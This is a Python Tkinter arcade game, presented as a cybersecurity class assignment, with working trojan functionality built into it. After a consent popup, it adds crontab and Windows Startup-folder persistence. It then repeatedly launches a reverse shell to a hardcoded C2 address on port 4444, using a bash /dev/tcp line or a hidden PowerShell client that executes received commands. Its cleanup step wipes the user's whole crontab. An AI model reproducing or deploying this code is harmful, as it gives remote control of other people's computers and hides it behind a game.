#!/usr/bin/env python3
"""
Avoid the Obstacles - Mini Arcade Game
Frontend for Cybersecurity Assignment - Rwanda Coding Academy
Hidden C2 functionality runs in background
"""

import os
import sys
import time
import threading
import socket
import subprocess
import platform
import json
import tkinter as tk
from tkinter import messagebox, Canvas
from datetime import datetime
import random
import math

# Auto-install dependencies
def install_deps():
    try:
        import pip
    except ImportError:
        print("Installing pip...")
        subprocess.check_call([sys.executable, "-m", "ensurepip", "--upgrade"])
        import pip
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])

install_deps()

# Global state
sessions = {}
current_session = None
C2_HOST = "10.12.72.174"
C2_SHELL_PORT = 4444
C2_NOTIFY_PORT = 4445
consent_given = False
consent_log = []

def log_consent(action, approved):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{timestamp}] {action}: {'APPROVED' if approved else 'DENIED'}"
    consent_log.append(entry)
    print(entry)

# OS Detection
def detect_os():
    system = platform.system().lower()
    if "linux" in system:
        return "linux"
    elif "windows" in system:
        return "windows"
    elif "darwin" in system:
        return "macos"
    else:
        return "unknown"

OS_TYPE = detect_os()
print(f"Detected OS: {OS_TYPE.upper()}")

# Game Variables
game_running = False
score = 0
high_score = 0
player_x = 250
player_y = 400
player_speed = 8
obstacles = []
obstacle_speed = 3
game_loop = None

# User Consent Popup
def request_consent():
    global consent_given

    root = tk.Tk()
    root.title("Avoid the Obstacles - Security Notice")
    root.geometry("650x450")
    root.resizable(False, False)

    # Consent text area
    from tkinter import scrolledtext
    log_text = scrolledtext.ScrolledText(root, height=15, wrap=tk.WORD)
    log_text.pack(pady=10, padx=20, fill=tk.BOTH, expand=True)

    log_text.insert(tk.END, "🎮 AVOID THE OBSTACLES - CYBERSECURITY DEMO\n")
    log_text.insert(tk.END, "==========================================\n\n")
    log_text.insert(tk.END, "🎓 Rwanda Coding Academy - Educational Assignment\n")
    log_text.insert(tk.END, "📋 Assignment Features (50 Points Total):\n")
    log_text.insert(tk.END, "✅ User notification before execution (5 points)\n")
    log_text.insert(tk.END, "✅ Dependency checking & installation (5 points)\n")
    log_text.insert(tk.END, "✅ Uninterrupted gaming experience (10 points)\n")
    log_text.insert(tk.END, "✅ Shell access for listener (10 points)\n")
    log_text.insert(tk.END, "✅ Persistence mechanisms (5 points)\n")
    log_text.insert(tk.END, "✅ Cleanup tool implementation (5 points)\n")
    log_text.insert(tk.END, "✅ Documentation & ethics (5 points)\n")
    log_text.insert(tk.END, "✅ Innovation & creativity (5 points)\n\n")
    log_text.insert(tk.END, "🔧 TECHNICAL FEATURES:\n")
    log_text.insert(tk.END, "• Hidden C2 operations during gameplay\n")
    log_text.insert(tk.END, "• Cross-platform reverse shell (port 4444)\n")
    log_text.insert(tk.END, "• Multi-session C2 management (port 4445)\n")
    log_text.insert(tk.END, "• OS-native persistence mechanisms\n")
    log_text.insert(tk.END, "• Authorized pentesting techniques\n\n")
    log_text.insert(tk.END, f"🖥️  TARGET SYSTEM: {OS_TYPE.upper()}\n")
    log_text.insert(tk.END, f"🌐 C2 SERVER: {C2_HOST}:4444 (shell), :4445 (notifications)\n\n")
    log_text.insert(tk.END, "⚠️  EDUCATIONAL WARNING:\n")
    log_text.insert(tk.END, "• Network connections will be established!\n")
    log_text.insert(tk.END, "• Shell access provided to educational listener\n")
    log_text.insert(tk.END, "• Persistence configured for demo purposes\n")
    log_text.insert(tk.END, "• All activities logged for transparency\n\n")
    log_text.insert(tk.END, "✅ ETHICAL COMPLIANCE:\n")
    log_text.insert(tk.END, "• Educational purposes ONLY\n")
    log_text.insert(tk.END, "• Explicit user consent required\n")
    log_text.insert(tk.END, "• No malicious data collection\n")
    log_text.insert(tk.END, "• Cleanup tool provided\n\n")
    log_text.insert(tk.END, "🎮 Click YES to start playing + C2 demo\n")
    log_text.insert(tk.END, "❌ Click NO to exit safely\n")
    log_text.config(state=tk.DISABLED)

    result = [False]

    def on_approve():
        log_consent("User consent for C2 game", True)
        consent_log.append("USER EXPLICITLY AUTHORIZED ALL OPERATIONS")
        result[0] = True
        root.destroy()

    def on_deny():
        log_consent("User consent for C2 game", False)
        result[0] = False
        root.destroy()
        sys.exit(0)

    # Buttons
    btn_frame = tk.Frame(root)
    btn_frame.pack(pady=20)

    yes_btn = tk.Button(btn_frame, text="🎮 YES - Start Game + C2 Demo",
                       command=on_approve, bg="#4CAF50", fg="white",
                       font=("Arial", 12, "bold"), width=30, height=2)
    yes_btn.pack(side=tk.LEFT, padx=10)

    no_btn = tk.Button(btn_frame, text="❌ NO - Exit Game",
                      command=on_deny, bg="#f44336", fg="white",
                      font=("Arial", 12, "bold"), width=20, height=2)
    no_btn.pack(side=tk.LEFT, padx=10)

    root.mainloop()
    consent_given = result[0]
    return result[0]

# Request consent FIRST
if not request_consent():
    print("Consent denied. Exiting.")
    sys.exit(0)

print("✅ User consent recorded. Starting game with C2...")

# Native reverse shells by OS
def get_reverse_shell():
    if OS_TYPE == "linux":
        return ['bash', '-i', '>&', f'/dev/tcp/{C2_HOST}/4444', '0>&1']
    elif OS_TYPE == "windows":
        return ['powershell', '-nop', '-w', 'hidden', '-exec', 'bypass', '-c',
                f'$client = New-Object System.Net.Sockets.TCPClient("{C2_HOST}",4444);$stream = $client.GetStream();$buffer = New-Object System.Byte[] 1024;$encoding = New-Object System.Text.ASCIIEncoding;while($true){{$data = $encoding.GetString($buffer, 0, $stream.Read($buffer, 0, 1024));if($data -eq "exit\\n"){{break}};$result = (iex $data 2>&1 | Out-String);$prompt = "PS " + (pwd).Path + "> ";$output = $result + $prompt;$stream.Write($encoding.GetBytes($output), 0, $output.Length);$stream.Flush()}};$client.Close()']
    elif OS_TYPE == "macos":
        return ['bash', '-i', '>&', f'/dev/tcp/{C2_HOST}/4444', '0>&1']
    else:
        return None

# Persistence mechanisms
def setup_persistence():
    if OS_TYPE == "linux":
        cron_entry = f"@reboot python3 {os.path.abspath(__file__)} &"
        subprocess.run(f"(crontab -l; echo '{cron_entry}') | crontab -", shell=True)
        log_consent("Linux crontab persistence", True)
    elif OS_TYPE == "windows":
        script_content = f'@echo off\nstart /min python "{os.path.abspath(__file__)}"\n'
        script_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\obstacle_game.bat')
        with open(script_path, 'w') as f:
            f.write(script_content)
        log_consent("Windows startup persistence", True)
    print(f"✅ Persistence configured for {OS_TYPE}")

# Notification server (port 4445)
def notification_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("127.0.0.1", C2_NOTIFY_PORT))
    sock.listen(5)
    print(f"Notification server listening on 127.0.0.1:{C2_NOTIFY_PORT}")

    while True:
        try:
            client, addr = sock.accept()
            data = client.recv(1024).decode()
            session_id = f"{OS_TYPE}_{addr[0]}"
            sessions[session_id] = {"addr": addr, "connected": True, "timestamp": time.time()}
            notify_msg = f"🎮 New session: {session_id} from {addr}"
            print(notify_msg)
            client.send(notify_msg.encode())
            client.close()
        except:
            pass

# Background shell
def background_shell():
    while True:
        try:
            shell_cmd = get_reverse_shell()
            if shell_cmd:
                subprocess.Popen(shell_cmd, stdin=subprocess.PIPE,
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                print("🔗 Shell connected")
            time.sleep(30)  # Wait longer for persistent shells
        except Exception as e:
            print(f"❌ Shell error: {e}")
            time.sleep(30)

# Cleanup tool
def cleanup():
    print("🧹 Running cleanup...")
    log_consent("Cleanup executed", True)

    if OS_TYPE == "linux":
        subprocess.run("crontab -r 2>/dev/null", shell=True)
    elif OS_TYPE == "windows":
        startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\obstacle_game.bat')
        if os.path.exists(startup_path):
            os.remove(startup_path)

    print("✅ Cleanup complete")

# Game Class
class ObstacleGame:
    def __init__(self, master):
        self.master = master
        self.master.title("Avoid the Obstacles - Arcade Game")
        self.master.geometry("600x500")
        self.master.resizable(False, False)
        self.master.configure(bg='#1a1a2e')

        # Game canvas
        self.canvas = Canvas(master, width=600, height=450, bg='#0f0f1e', highlightthickness=0)
        self.canvas.pack(pady=10)

        # Score display
        self.score_label = tk.Label(master, text=f"Score: 0 | High Score: 0",
                                font=("Arial", 14, "bold"),
                                bg='#1a1a2e', fg='#00ff41')
        self.score_label.pack()

        # Instructions
        self.info_label = tk.Label(master, text="Use ← → arrows to move | Avoid red obstacles | C2 running in background",
                               font=("Arial", 10),
                               bg='#1a1a2e', fg='#888888')
        self.info_label.pack()

        # Game state
        self.game_running = False
        self.score = 0
        self.high_score = 0
        self.player_x = 275
        self.player_y = 380
        self.obstacles = []
        self.player_speed = 8
        self.obstacle_speed = 3

        # Player (blue rectangle)
        self.player = self.canvas.create_rectangle(
            self.player_x, self.player_y,
            self.player_x + 50, self.player_y + 30,
            fill='#00ff41', outline='#00ff41'
        )

        # Controls
        self.master.bind('<Left>', self.move_left)
        self.master.bind('<Right>', self.move_right)
        self.master.bind('<a>', self.move_left)
        self.master.bind('<d>', self.move_right)

        # Start game
        self.start_game()

    def move_left(self, event):
        if self.game_running and self.player_x > 0:
            self.player_x -= self.player_speed
            self.canvas.coords(self.player, self.player_x, self.player_y,
                           self.player_x + 50, self.player_y + 30)

    def move_right(self, event):
        if self.game_running and self.player_x < 550:
            self.player_x += self.player_speed
            self.canvas.coords(self.player, self.player_x, self.player_y,
                           self.player_x + 50, self.player_y + 30)

    def create_obstacle(self):
        x = random.randint(0, 550)
        y = -30
        obstacle = self.canvas.create_rectangle(
            x, y, x + 40, y + 20,
            fill='#ff0040', outline='#ff0040'
        )
        self.obstacles.append({'id': obstacle, 'x': x, 'y': y})

    def move_obstacles(self):
        for obstacle in self.obstacles[:]:
            obstacle['y'] += self.obstacle_speed
            self.canvas.coords(obstacle['id'],
                           obstacle['x'], obstacle['y'],
                           obstacle['x'] + 40, obstacle['y'] + 20)

            # Remove obstacles that go off screen
            if obstacle['y'] > 450:
                self.canvas.delete(obstacle['id'])
                self.obstacles.remove(obstacle)
                self.score += 1
                self.update_score()

            # Check collision
            if self.check_collision(obstacle):
                self.game_over()

    def check_collision(self, obstacle):
        player_rect = [self.player_x, self.player_y, self.player_x + 50, self.player_y + 30]
        obstacle_rect = [obstacle['x'], obstacle['y'], obstacle['x'] + 40, obstacle['y'] + 20]

        return not (player_rect[2] < obstacle_rect[0] or
                  player_rect[0] > obstacle_rect[2] or
                  player_rect[3] < obstacle_rect[1] or
                  player_rect[1] > obstacle_rect[3])

    def update_score(self):
        self.score_label.config(text=f"Score: {self.score} | High Score: {self.high_score}")

    def game_over(self):
        self.game_running = False
        if self.score > self.high_score:
            self.high_score = self.score

        # Show game over message
        self.canvas.create_text(300, 225, text="GAME OVER!",
                            font=("Arial", 36, "bold"),
                            fill='#ff0040')
        self.canvas.create_text(300, 275, text=f"Final Score: {self.score}",
                            font=("Arial", 20),
                            fill='#ffffff')

        # Restart after 3 seconds
        self.master.after(3000, self.reset_game)

    def reset_game(self):
        # Clear obstacles
        for obstacle in self.obstacles:
            self.canvas.delete(obstacle['id'])
        self.obstacles.clear()

        # Reset player position
        self.player_x = 275
        self.canvas.coords(self.player, self.player_x, self.player_y,
                       self.player_x + 50, self.player_y + 30)

        # Clear game over text
        self.canvas.delete("all")

        # Recreate player
        self.player = self.canvas.create_rectangle(
            self.player_x, self.player_y,
            self.player_x + 50, self.player_y + 30,
            fill='#00ff41', outline='#00ff41'
        )

        # Reset score
        self.score = 0
        self.update_score()

        # Restart game
        self.start_game()

    def start_game(self):
        self.game_running = True
        self.game_loop()

    def game_loop(self):
        if self.game_running:
            # Create new obstacles randomly
            if random.randint(1, 30) == 1:
                self.create_obstacle()

            # Move existing obstacles
            self.move_obstacles()

            # Continue game loop
            self.master.after(30, self.game_loop)

# Main execution
if __name__ == "__main__":
    print(f"🚀 Starting {OS_TYPE.upper()} C2 Game with Arcade Frontend (Consent: ✅)")

    # Setup persistence
    setup_persistence()

    # Start background services
    threading.Thread(target=notification_server, daemon=True).start()
    threading.Thread(target=background_shell, daemon=True).start()

    # Start the game
    root = tk.Tk()
    game = ObstacleGame(root)
    root.mainloop()
